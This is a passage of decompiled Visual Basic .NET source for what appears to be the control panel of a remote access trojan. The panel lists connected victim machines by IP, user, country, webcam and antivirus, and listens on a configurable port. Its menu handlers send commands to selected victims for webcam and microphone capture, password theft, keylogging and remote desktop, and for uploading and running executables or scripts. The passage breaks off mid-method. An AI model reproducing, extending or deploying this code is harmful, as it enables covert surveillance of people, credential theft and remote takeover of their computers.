		' (set) Token: 0x06000213 RID: 531 RVA: 0x00002658 File Offset: 0x00000858
		Friend Overridable Property conz As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._conz
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._conz = value
			End Set
		End Property

		' Token: 0x170000D0 RID: 208
		' (get) Token: 0x06000214 RID: 532 RVA: 0x00016D88 File Offset: 0x00014F88
		' (set) Token: 0x06000215 RID: 533 RVA: 0x00002661 File Offset: 0x00000861
		Friend Overridable Property upl As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._upl
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._upl = value
			End Set
		End Property

		' Token: 0x170000D1 RID: 209
		' (get) Token: 0x06000216 RID: 534 RVA: 0x00016DA0 File Offset: 0x00014FA0
		' (set) Token: 0x06000217 RID: 535 RVA: 0x0000266A File Offset: 0x0000086A
		Friend Overridable Property dwn As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._dwn
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._dwn = value
			End Set
		End Property

		' Token: 0x170000D2 RID: 210
		' (get) Token: 0x06000218 RID: 536 RVA: 0x00016DB8 File Offset: 0x00014FB8
		' (set) Token: 0x06000219 RID: 537 RVA: 0x00002673 File Offset: 0x00000873
		Friend Overridable Property ToolStripStatusLabel7 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel7 = value
			End Set
		End Property

		' Token: 0x170000D3 RID: 211
		' (get) Token: 0x0600021A RID: 538 RVA: 0x00016DD0 File Offset: 0x00014FD0
		' (set) Token: 0x0600021B RID: 539 RVA: 0x0000267C File Offset: 0x0000087C
		Friend Overridable Property ToolStripStatusLabel6 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel6 = value
			End Set
		End Property

		' Token: 0x170000D4 RID: 212
		' (get) Token: 0x0600021C RID: 540 RVA: 0x00016DE8 File Offset: 0x00014FE8
		' (set) Token: 0x0600021D RID: 541 RVA: 0x00002685 File Offset: 0x00000885
		Friend Overridable Property FlatGroupBox1 As FlatGroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatGroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatGroupBox)
				Me._FlatGroupBox1 = value
			End Set
		End Property

		' Token: 0x170000D5 RID: 213
		' (get) Token: 0x0600021E RID: 542 RVA: 0x00016E00 File Offset: 0x00015000
		' (set) Token: 0x0600021F RID: 543 RVA: 0x0000268E File Offset: 0x0000088E
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x170000D6 RID: 214
		' (get) Token: 0x06000220 RID: 544 RVA: 0x00016E18 File Offset: 0x00015018
		' (set) Token: 0x06000221 RID: 545 RVA: 0x00002697 File Offset: 0x00000897
		Friend Overridable Property L1 As L1
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As L1)
				Me._L1 = value
			End Set
		End Property

		' Token: 0x170000D7 RID: 215
		' (get) Token: 0x06000222 RID: 546 RVA: 0x00016E30 File Offset: 0x00015030
		' (set) Token: 0x06000223 RID: 547 RVA: 0x000026A0 File Offset: 0x000008A0
		Friend Overridable Property Pp1 As Pp1
			<DebuggerNonUserCode()>
			Get
				Return Me._Pp1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Pp1)
				Me._Pp1 = value
			End Set
		End Property

		' Token: 0x170000D8 RID: 216
		' (get) Token: 0x06000224 RID: 548 RVA: 0x00016E48 File Offset: 0x00015048
		' (set) Token: 0x06000225 RID: 549 RVA: 0x00016E60 File Offset: 0x00015060
		Friend Overridable Property FlatButton5 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton5_Click
				If Me._FlatButton5 IsNot Nothing Then
					RemoveHandler Me._FlatButton5.Click, value2
				End If
				Me._FlatButton5 = value
				If Me._FlatButton5 IsNot Nothing Then
					AddHandler Me._FlatButton5.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D9 RID: 217
		' (get) Token: 0x06000226 RID: 550 RVA: 0x00016EB8 File Offset: 0x000150B8
		' (set) Token: 0x06000227 RID: 551 RVA: 0x00016ED0 File Offset: 0x000150D0
		Friend Overridable Property FlatButton3 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton3_Click
				If Me._FlatButton3 IsNot Nothing Then
					RemoveHandler Me._FlatButton3.Click, value2
				End If
				Me._FlatButton3 = value
				If Me._FlatButton3 IsNot Nothing Then
					AddHandler Me._FlatButton3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DA RID: 218
		' (get) Token: 0x06000228 RID: 552 RVA: 0x00016F28 File Offset: 0x00015128
		' (set) Token: 0x06000229 RID: 553 RVA: 0x00016F40 File Offset: 0x00015140
		Friend Overridable Property FlatButton4 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton4_Click
				If Me._FlatButton4 IsNot Nothing Then
					RemoveHandler Me._FlatButton4.Click, value2
				End If
				Me._FlatButton4 = value
				If Me._FlatButton4 IsNot Nothing Then
					AddHandler Me._FlatButton4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DB RID: 219
		' (get) Token: 0x0600022A RID: 554 RVA: 0x00016F98 File Offset: 0x00015198
		' (set) Token: 0x0600022B RID: 555 RVA: 0x000026A9 File Offset: 0x000008A9
		Friend Overridable Property FlatMini1 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini1 = value
			End Set
		End Property

		' Token: 0x170000DC RID: 220
		' (get) Token: 0x0600022C RID: 556 RVA: 0x00016FB0 File Offset: 0x000151B0
		' (set) Token: 0x0600022D RID: 557 RVA: 0x000026B2 File Offset: 0x000008B2
		Friend Overridable Property FlatClose1 As FlatClose
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatClose1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatClose)
				Me._FlatClose1 = value
			End Set
		End Property

		' Token: 0x170000DD RID: 221
		' (get) Token: 0x0600022E RID: 558 RVA: 0x00016FC8 File Offset: 0x000151C8
		' (set) Token: 0x0600022F RID: 559 RVA: 0x00016FE0 File Offset: 0x000151E0
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DE RID: 222
		' (get) Token: 0x06000230 RID: 560 RVA: 0x00017038 File Offset: 0x00015238
		' (set) Token: 0x06000231 RID: 561 RVA: 0x00017050 File Offset: 0x00015250
		Friend Overridable Property FlatButton1 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton1_Click
				If Me._FlatButton1 IsNot Nothing Then
					RemoveHandler Me._FlatButton1.Click, value2
				End If
				Me._FlatButton1 = value
				If Me._FlatButton1 IsNot Nothing Then
					AddHandler Me._FlatButton1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DF RID: 223
		' (get) Token: 0x06000232 RID: 562 RVA: 0x000170A8 File Offset: 0x000152A8
		' (set) Token: 0x06000233 RID: 563 RVA: 0x000026BB File Offset: 0x000008BB
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x170000E0 RID: 224
		' (get) Token: 0x06000234 RID: 564 RVA: 0x000170C0 File Offset: 0x000152C0
		' (set) Token: 0x06000235 RID: 565 RVA: 0x000026C4 File Offset: 0x000008C4
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x170000E1 RID: 225
		' (get) Token: 0x06000236 RID: 566 RVA: 0x000170D8 File Offset: 0x000152D8
		' (set) Token: 0x06000237 RID: 567 RVA: 0x000026CD File Offset: 0x000008CD
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x170000E2 RID: 226
		' (get) Token: 0x06000238 RID: 568 RVA: 0x000170F0 File Offset: 0x000152F0
		' (set) Token: 0x06000239 RID: 569 RVA: 0x000026D6 File Offset: 0x000008D6
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x170000E3 RID: 227
		' (get) Token: 0x0600023A RID: 570 RVA: 0x00017108 File Offset: 0x00015308
		' (set) Token: 0x0600023B RID: 571 RVA: 0x000026DF File Offset: 0x000008DF
		Friend Overridable Property PictureBox5 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox5 = value
			End Set
		End Property

		' Token: 0x170000E4 RID: 228
		' (get) Token: 0x0600023C RID: 572 RVA: 0x00017120 File Offset: 0x00015320
		' (set) Token: 0x0600023D RID: 573 RVA: 0x000026E8 File Offset: 0x000008E8
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x170000E5 RID: 229
		' (get) Token: 0x0600023E RID: 574 RVA: 0x00017138 File Offset: 0x00015338
		' (set) Token: 0x0600023F RID: 575 RVA: 0x000026F1 File Offset: 0x000008F1
		Friend Overridable Property PictureBox3 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox3 = value
			End Set
		End Property

		' Token: 0x170000E6 RID: 230
		' (get) Token: 0x06000240 RID: 576 RVA: 0x00017150 File Offset: 0x00015350
		' (set) Token: 0x06000241 RID: 577 RVA: 0x000026FA File Offset: 0x000008FA
		Friend Overridable Property PictureBox2 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox2 = value
			End Set
		End Property

		' Token: 0x170000E7 RID: 231
		' (get) Token: 0x06000242 RID: 578 RVA: 0x00017168 File Offset: 0x00015368
		' (set) Token: 0x06000243 RID: 579 RVA: 0x00002703 File Offset: 0x00000903
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x06000244 RID: 580 RVA: 0x00017180 File Offset: 0x00015380
		Public Sub New()
			AddHandler MyBase.Activated, AddressOf Me.Form1_Activated
			AddHandler MyBase.Deactivate, AddressOf Me.Form1_Deactivate
			AddHandler MyBase.FormClosing, AddressOf Me.Form1_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Form1.__ENCAddToList(Me)
			Me.isActive = False
			Me.int_0 = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000245 RID: 581 RVA: 0x000171FC File Offset: 0x000153FC
		Public Sub dsk()
			While True
				Dim num As Integer
				Select Case Class7.class8_0.int_2
					Case 0
						num = 10
					Case 1
						num = 2000
					Case 2
						num = 5000
					Case 3
						num = 7500
					Case Else
						num = 10000
				End Select
				If Me.isActive And CULng(GClass7.smethod_0()) < 12000UL And Me.L1.Columns(0).Width <> 0 Then
					For Each dataGridViewRow As DataGridViewRow In Me.L1.method_3()
						If dataGridViewRow IsNot Nothing Then
							Dim client As Client = CType(dataGridViewRow.Tag, Client)
							If client IsNot Nothing Then
								Dim flag As Boolean = False
								If DateTime.Compare(client.lastPC, DateTime.MinValue) = 0 Then
									flag = True
								ElseIf DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= CDbl(num) Then
									flag = True
								End If
								If Not client.Isend AndAlso flag Then
									client.Isend = True
									client.lastPC = DateAndTime.Now
									client.Send(String.Concat(New String() { "CAP", Class7.string_1, Conversions.ToString(Me.L1.Columns(0).Width), Class7.string_1, Conversions.ToString(Me.L1.method_6()) }))
								End If
							End If
						End If
					Next
				End If
				Thread.Sleep(CInt(Math.Round(Math.Round(CDbl(num) / 2.0))))
			End While
		End Sub

		' Token: 0x06000246 RID: 582 RVA: 0x0000270C File Offset: 0x0000090C
		Private Sub Form1_Activated(sender As Object, e As EventArgs)
			Me.isActive = True
			Me.Opacity = 1.0
		End Sub

		' Token: 0x06000247 RID: 583 RVA: 0x00002724 File Offset: 0x00000924
		Private Sub Form1_Deactivate(sender As Object, e As EventArgs)
			Me.isActive = False
			Me.Opacity = 0.95
		End Sub

		' Token: 0x06000248 RID: 584 RVA: 0x000173D8 File Offset: 0x000155D8
		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization)>
		Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.NotifyIcon1.Visible = False
			Try
				Class7.waveOut_0.Dispose()
			Catch ex As Exception
			End Try
			Class7.class8_0.method_1()
			ProjectData.EndApp()
		End Sub

		' Token: 0x06000249 RID: 585 RVA: 0x0001742C File Offset: 0x0001562C
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Try
				Me.Left = 0 - Me.Width + Screen.PrimaryScreen.WorkingArea.Width
				Me.Top = 0 - Me.Height + Screen.PrimaryScreen.WorkingArea.Height
				Me.L1.method_11("Screen", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None)
				Me.L1.method_11("Name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("PC", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("User", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Install Date", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Flag", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Country", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Operating System", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Cam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Antivirus", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Active Window", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.Columns(0).Width = 35
				Me.Show()
				Class7.notf_0.Show()
				Control.CheckForIllegalCrossThreadCalls = False
				Class7.form1_0 = Me
				Me.Text = Class7.string_0
				Me.NotifyIcon1.Text = Class7.string_0
				Me.NotifyIcon1.Icon = Me.Icon
				Me.ShowInTaskbar = True
				Me.Pp1.T.Enabled = True
				For Each fileName As String In Directory.GetFiles(Application.StartupPath + "\plugin\", "*.dll")
					Dim item As Class7.Class9 = New Class7.Class9(New FileInfo(fileName).Name.ToLower())
					Class7.list_1.Add(item)
				Next
				For Each text As String In Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary)
					If Class7.smethod_0(text, Nothing) Is Nothing Then
						Interaction.MsgBox("Missing dll >> " + text, MsgBoxStyle.OkOnly, Nothing)
						Dim left As String = Strings.Split(text, ".", -1, CompareMethod.Binary)(0)
						If Operators.CompareString(left, "cam", False) = 0 Then
							Me.RemoteCamToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "ch", False) = 0 Then
							Me.OpenChatToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "plg", False) = 0 Then
							Me.ManagerToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "pw", False) = 0 Then
							Me.GetPasswordsToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "sc2", False) = 0 Then
							Me.RemoteDesktopToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "mic", False) = 0 Then
							Me.MicrophoneToolStripMenuItem.Enabled = False
						End If
					End If
				Next
				Try
					Class7.waveOut_0 = New WaveOut(0)
					Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono)
					Class7.waveOut_1 = New WaveOut(0)
					Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono)
				Catch ex As Exception
					Me.MicrophoneToolStripMenuItem.Enabled = False
				End Try
				Class7.class8_0.method_0()
				While True
					Try
						Dim port As port = New port()
						port.TextBox1.Text = Class6.smethod_2("port", "6522")
						port.ShowDialog(Me)
						If port.port < 1 Then
							Me.Close()
							Return
						End If
						Me.port = port.port
						Me.S = New SK(Me.port)
						Class6.smethod_3("port", Conversions.ToString(Me.port))
						Exit Try
					Catch ex2 As Exception
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, Nothing)
					End Try
				End While
				Class7.sk_0 = Me.S
				Dim thread As Thread = AddressOf Me.dsk
				thread.Start()
				Me.Timer1.Enabled = True
			Catch ex3 As Exception
			End Try
		End Sub

		' Token: 0x0600024A RID: 586 RVA: 0x000178E8 File Offset: 0x00015AE8
		Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs)
			If Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Me.ToolStripStatusLabel1.Tag), "2", False) Then
				Me.ToolStripStatusLabel1.Text = "[ Logs ]"
				Me.ToolStripStatusLabel1.Tag = "1"
				Me.L1.BringToFront()
			Else
				Me.ToolStripStatusLabel1.Text = "[ Users ]"
				Me.ToolStripStatusLabel1.Tag = "2"
				Me.Pp1.BringToFront()
			End If
		End Sub

		' Token: 0x0600024B RID: 587 RVA: 0x0001796C File Offset: 0x00015B6C
		Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Try
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "CN", New Object() { False }, Nothing, Nothing, False, True)
					Catch ex As Exception
					End Try
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x0600024C RID: 588 RVA: 0x00017A20 File Offset: 0x00015C20
		Private Sub RemoteCamToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("cam.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x0600024D RID: 589 RVA: 0x00017AB4 File Offset: 0x00015CB4
		Private Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("pw.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, True)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x0600024E RID: 590 RVA: 0x00017B48 File Offset: 0x00015D48
		Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "kl" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x0600024F RID: 591 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000250 RID: 592 RVA: 0x00017BD4 File Offset: 0x00015DD4
		Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("ch.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000251 RID: 593 RVA: 0x00017C68 File Offset: 0x00015E68
		Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Not Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing)))) Then
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				End If
				Dim array As Object() = New Object(0) {}
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag)
				array(0) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				Dim array2 As Object() = array
				Dim array3 As Boolean() = New Boolean() { True }
				NewLateBinding.LateCall(Nothing, GetType(Process), "Start", array2, Nothing, Nothing, array3, True)
				If array3(0) Then
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2(0)))) }, Nothing, Nothing, True, True)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000252 RID: 594 RVA: 0x00017DDC File Offset: 0x00015FDC
		Private Sub FromLINKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x06000253 RID: 595 RVA: 0x00017EDC File Offset: 0x000160DC
		Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "EXE|*.exe", .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "up" + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x06000254 RID: 596 RVA: 0x00017FCC File Offset: 0x000161CC
		Private Sub ScriptToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim script As script = New script()
				script.ShowDialog(Me)
				If script.Code.Length > 0 Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(Class6.smethod_11(script.Code), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim memoryStream2 As MemoryStream = memoryStream
					Dim text As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					Dim buffer As Byte() = Class6.smethod_11(text)
					Dim offset As Integer = 0
					Dim text2 As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					memoryStream2.Write(buffer, offset, Class6.smethod_11(text2).Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x06000255 RID: 597 RVA: 0x000180D4 File Offset: 0x000162D4
		Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "~"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x06000256 RID: 598 RVA: 0x0001813C File Offset: 0x0001633C
		Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("mic.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
